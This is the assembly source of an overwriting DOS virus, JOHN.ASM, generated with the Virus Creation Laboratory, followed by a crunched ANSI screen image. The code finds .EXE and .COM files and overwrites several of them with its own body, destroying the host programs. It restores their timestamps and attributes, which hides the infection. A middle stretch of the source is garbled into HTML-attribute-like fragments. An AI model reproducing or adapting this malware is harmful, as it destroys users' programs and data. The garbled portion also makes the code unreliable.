

; JOHN.ASM -- For John Boy!
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Pentagrame

virus_type      equ     1                       ; Overwriting Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

start           label   near

main            proc    near
flag:           or      di,0
		xchg    di,ax

		mov     cx,0004h                ; Do 4 infections
search_loop:    push    cx                      ; Save CX
		call    search_files            ; Find and infect a file
		pop     cx                      ; Restore CX
		loop    search_loop             ; Repeat until CX is 0

		mov     si,offset data00        ; SI points to data
		mov     cx,03B3h                ; Second argument is 947
		push    di                      ; Save DI
		push    es                      ; Save ES

		jcxz    uncrunch_done           ; Exit if there are no characters

		mov     ah,0Fh                  ; BIOS get screen mode function
		int     10h
		xor     ah,ah                   ; BIOS set screen mode function
		int     10h                     ; Clear the screen

		xor     di,di
		mov     ax,0B800h               ; AX is set to video segment
		mov     es,ax                   ; ES holds video segment

		mov     dx,di                   ; Save X coordinate for later
		xor     ax,ax                   ; Set current attributes
		cld

loopa:          lodsb                           ; Get next character
		cmp     al,32                   ; Is it a control character?
		jb      foreground              ; Handle it if it is
		stosw                           ; Save letter on screen
next:           loop    loopa                   ; Repeat until we're done
		jmp     short uncrunch_done     ; Leave this routine

foreground:     cmp     al,16                   ; Are we changing the foreground?
		jnb     background              ; If not, check the background
		and     ah,0F0h                 ; Strip off old foreground
		or      ah,al                   ; Put the new one on
		jmp     short next              ; Resume looping

background:     cmp     al,24                   ; Are we changing the background?
		je      next_line               ; If AL = 24, go to next line
		jnb     flash_bit_toggle        ; If AL > 24 set the flash bit
		sub     al,16                   ; Change AL to a color number
		add     al,al                   ; Crude way of shifting left
		add     al,al                   ; four bits without changing
		add     al,al                   ; CL or wasting space.  Ok,
		add     al,al                   ; I guess.
		and     al,08Fh                 ; Strip off old background
		or      ah,al                   ; Put the new one on
		jmp     short next              ; Resume looping

next_line:      add     dx,160                  ; Skip a whole line (80 chars.
		mov     di,dx                   ; AND 80 attribs.)
		jmp     short next              ; Resume looping

flash_bit_toggle: cmp   al,27                   ; Is it a blink toggle?
		jb      multi_output            ; If AL < 27,="" it's="" a="" blinker="" jne="" next="" ;="" otherwise="" resume="" looping="" xor="" ah,128="" ;="" toggle="" the="" flash="" bit="" jmp="" short="" next="" ;="" resume="" looping="" multi_output:="" cmp="" al,25="" ;="" set="" zero="" flag="" if="" multi-space="" mov="" bx,cx="" ;="" save="" main="" counter="" lodsb="" ;="" get="" number="" of="" repititions="" mov="" cl,al="" ;="" put="" it="" in="" cl="" mov="" al,'="" '="" ;="" al="" holds="" a="" space="" jz="" start_output="" ;="" if="" displaying="" spaces,="" jump="" lodsb="" ;="" otherwise="" get="" character="" to="" use="" dec="" bx="" ;="" adjust="" main="" counter="" start_output:="" xor="" ch,ch="" ;="" clear="" ch="" inc="" cx="" ;="" add="" one="" to="" count="" rep="" stosw="" ;="" display="" the="" character="" mov="" cx,bx="" ;="" restore="" main="" counter="" dec="" cx="" ;="" adjust="" main="" counter="" loopnz="" loopa="" ;="" resume="" looping="" if="" not="" done="" uncrunch_done:="" pop="" es="" ;="" restore="" es="" pop="" di="" ;="" restore="" di="" mov="" ax,04c00h="" ;="" dos="" terminate="" function="" int="" 021h="" main="" endp="" search_files="" proc="" near="" mov="" dx,offset="" exe_mask="" ;="" dx="" points="" to="" "*.exe"="" call="" find_files="" ;="" try="" to="" infect="" a="" file="" mov="" dx,offset="" com_mask="" ;="" dx="" points="" to="" "*.com"="" call="" find_files="" ;="" try="" to="" infect="" a="" file="" jnc="" done_searching="" ;="" if="" successful="" then="" exit="" done_searching:="" ret="" ;="" return="" to="" caller="" exe_mask="" db="" "*.exe",0="" ;="" mask="" for="" all="" .exe="" files="" com_mask="" db="" "*.com",0="" ;="" mask="" for="" all="" .com="" files="" search_files="" endp="" find_files="" proc="" near="" push="" bp="" ;="" save="" bp="" mov="" ah,02fh="" ;="" dos="" get="" dta="" function="" int="" 021h="" push="" bx="" ;="" save="" old="" dta="" address="" mov="" bp,sp="" ;="" bp="" points="" to="" local="" buffer="" sub="" sp,128="" ;="" allocate="" 128="" bytes="" on="" stack="" push="" dx="" ;="" save="" file="" mask="" lea="" dx,[bp="" -="" 128]="" ;="" dx="" points="" to="" buffer="" mov="" ah,01ah="" ;="" dos="" set="" dta="" function="" int="" 021h="" mov="" cx,00100111b="" ;="" cx="" holds="" all="" file="" attributes="" mov="" ah,04eh="" ;="" dos="" find="" first="" file="" function="" pop="" dx="" ;="" restore="" file="" mask="" find_a_file:="" int="" 021h="" jc="" done_finding="" ;="" exit="" if="" no="" files="" found="" call="" infect_file="" ;="" infect="" the="" file!="" jnc="" done_finding="" ;="" exit="" if="" no="" error="" mov="" ah,04fh="" ;="" dos="" find="" next="" file="" function="" jmp="" short="" find_a_file="" ;="" try="" finding="" another="" file="" done_finding:="" mov="" sp,bp="" ;="" restore="" old="" stack="" frame="" mov="" ah,01ah="" ;="" dos="" set="" dta="" function="" pop="" dx="" ;="" retrieve="" old="" dta="" address="" int="" 021h="" pop="" bp="" ;="" restore="" bp="" ret="" ;="" return="" to="" caller="" find_files="" endp="" infect_file="" proc="" near="" mov="" ah,02fh="" ;="" dos="" get="" dta="" address="" function="" int="" 021h="" mov="" si,bx="" ;="" si="" points="" to="" the="" dta="" mov="" byte="" ptr="" [set_carry],0="" ;="" assume="" we'll="" fail="" cmp="" word="" ptr="" [si="" +="" 01ch],0="" ;="" is="" the="" file=""> 65535 bytes?
		jne     infection_done          ; If it is then exit

		cmp     word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
		je      infection_done          ; If it is then skip it

		cmp     word ptr [si + 01Ah],(finish - start)
		jb      infection_done          ; If it's too small then exit

		mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     cx,4                    ; CX holds bytes to read (4)
		mov     ah,03Fh                 ; DOS read from file function
		mov     dx,offset buffer        ; DX points to buffer
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		push    si                      ; Save DTA address before compare
		mov     si,offset buffer        ; SI points to comparison buffer
		mov     cx,4                    ; CX holds number of bytes (4)
		mov     di,offset flag          ; DI points to virus flag    
	rep     cmpsb                           ; Compare the first four bytes
		pop     si                      ; Restore DTA address
		je      infection_done          ; If equal then exit
		mov     byte ptr [set_carry],1  ; Success -- the file is OK

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		mov     dx,offset start         ; DX points to start of virus
		int     021h

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

buffer          db      4 dup (?)               ; Buffer to hold test data
set_carry       db      ?                       ; Set-carry-on-exit flag
infect_file     endp


data00:          ; TheDraw Assembler Crunched Screen Image
		
		IMAGEDATA_WIDTH EQU 80
		IMAGEDATA_DEPTH EQU 25
		IMAGEDATA_LENGTH EQU 947
		IMAGEDATA LABEL BYTE
			DB      15,16,24,24,24,25,2,20,25,'I',24,16,25,2,23,' ',16,25
			DB      'G',23,' ',24,16,25,2,20,' ',14,27,'ÜÛÛÜ',16,25,2,20,'Ü'
			DB      'ÛÛÜ',16,'  ',20,'Ü',26,6,'ÛÜ',16,25,2,20,'Ü',26,6,'Û'
			DB      'Ü',16,'  ',20,'Ü',26,8,'ÛÜ',16,' ',20,'Ü',26,8,'ÛÜ',16
			DB      ' ',20,'Ü',26,8,'ÛÜ',24,16,25,2,23,' ',20,26,4,'ÛÜ',26
			DB      4,'Û',16,' ',20,26,3,'Ûß',16,'  ',20,'ßÛÛÛ',16,' ',20
			DB      26,3,'Ûßßß',26,3,'Û',16,' ',20,26,3,'Û',16,25,3,20,'ß'
			DB      'ßß',16,' ',20,26,3,'Û',16,25,3,20,'ßßß',16,' ',20,26
			DB      3,'Û',16,25,3,20,'ßßß',16,' ',23,' ',24,16,25,2,23,' '
			DB      20,26,10,'Û',16,' ',20,26,3,'Û',16,25,7,20,26,3,'ÛÜÜ'
			DB      'Ü',26,3,'Û',16,' ',20,26,3,'Û',26,3,'Ü',16,25,3,20,26
			DB      3,'Û',26,4,'Ü',16,25,2,20,26,3,'Û',26,4,'Ü',16,25,2,23
			DB      ' ',24,16,25,2,20,' ',26,3,'Û',16,' ',20,'ß',16,' ',20
			DB      26,3,'Û',16,' ',20,26,3,'Û',16,25,7,20,26,10,'Û',16,' '
			DB      20,26,3,'Û',26,3,'ß',16,25,3,20,26,3,'Û',26,4,'ß',16,25
			DB      2,20,26,3,'Û',26,4,'ß',16,25,2,20,' ',24,16,25,2,23,' '
			DB      20,26,3,'Û',16,25,2,20,26,3,'Û',16,' ',20,26,3,'ÛÜ',16
			DB      '  ',20,'ÜÛÛÛ',16,' ',20,26,3,'Û',16,25,2,20,26,3,'Û'
			DB      16,' ',20,26,3,'Û',16,25,7,20,26,3,'Û',16,25,3,20,'Ü'
			DB      'ÜÜ',16,' ',20,26,3,'Û',16,25,3,20,'ÜÜÜ',16,' ',23,' '
			DB      24,16,25,2,23,' ',20,'ßÛÛß',16,25,2,20,'ßÛÛß',16,'  '
			DB      20,'ß',26,6,'Ûß',16,'  ',20,'ßÛÛß',16,25,2,20,'ßÛÛß',16
			DB      ' ',20,'ßÛÛß',16,25,7,20,'ß',26,8,'Ûß',16,' ',20,'ß',26
			DB      8,'Ûß',16,' ',23,' ',24,16,25,2,20,' ',16,25,'G',20,' '
			DB      24,16,25,2,23,' ',16,' ',20,'ÜÛÜ',16,25,2,20,'Ü',26,6
			DB      'ÛÜ',16,25,4,20,'Ü',26,6,'ÛÜ',16,25,3,20,'Ü',26,8,'Û'
			DB      'Ü',16,'  ',20,'Ü',26,6,'ÛÜ',16,25,2,20,'Ü',26,7,'ÛÜ'
			DB      16,25,2,23,' ',24,16,25,2,20,' ',26,4,'Û',16,' ',20,26
			DB      3,'Ûß',16,' ',20,'ß',26,3,'Û',16,25,2,20,26,3,'Ûßßß',26
			DB      3,'Û',16,25,2,20,26,3,'Û',16,25,3,20,'ßßß',16,' ',20,26
			DB      3,'Ûßßß',26,3,'Û',16,' ',20,26,3,'Ûß',16,25,2,20,'ßß'
			DB      'ß',16,25,2,23,' ',24,16,25,2,23,' ',20,26,4,'Û',16,' '
			DB      20,'ß',26,4,'ÛÜÜ',16,25,5,20,26,3,'ÛÜÜÜ',26,3,'Û',16,25
			DB      2,20,26,3,'Û',26,3,'Ü',16,25,3,20,26,3,'ÛÜÜÜ',26,3,'Û'
			DB      16,' ',20,26,3,'Û',16,'  ',20,26,3,'Ü',16,25,3,20,' '
			DB      24,16,25,2,23,' ',20,26,4,'Û',16,25,3,20,'ßß',26,4,'Û'
			DB      'Ü',16,25,2,20,26,10,'Û',16,25,2,20,26,3,'Û',26,3,'ß'
			DB      16,25,3,20,26,10,'Û',16,' ',20,26,3,'Û',16,'  ',20,'ß'
			DB      'ßÛÛÛ',16,25,2,23,' ',24,16,25,2,23,' ',20,26,4,'Û',16
			DB      ' ',20,26,3,'ÛÜ',16,' ',20,'Ü',26,3,'Û',16,25,2,20,26
			DB      3,'Û',16,25,2,20,26,3,'Û',16,25,2,20,26,3,'Û',16,25,7
			DB      20,26,3,'Û',16,25,2,20,26,3,'Û',16,' ',20,26,4,'ÛÜÜÜ'
			DB      'ÛÛÛ',16,25,2,23,' ',24,16,25,2,20,' ',16,' ',20,'ßÛ'
			DB      'ß',16,25,2,20,'ß',26,6,'Ûß',16,25,3,20,'ßÛÛß',16,25,2
			DB      20,'ßÛÛß',16,25,2,20,'ßÛÛß',16,25,7,20,'ßÛÛß',16,25,2
			DB      20,'ßÛÛß',16,'  ',20,'ß',26,7,'Ûß',16,25,2,20,' ',24,16
			DB      25,2,23,' ',16,25,'G',23,' ',24,16,25,2,23,' ',16,25,'G'
			DB      23,' ',24,16,25,2,20,' ',16,25,'G',20,' ',24,16,25,2,23
			DB      ' ',16,25,'G',23,' ',24,16,25,2,20,25,'I',24,24,24



finish          label   near

code            ends
		end     main

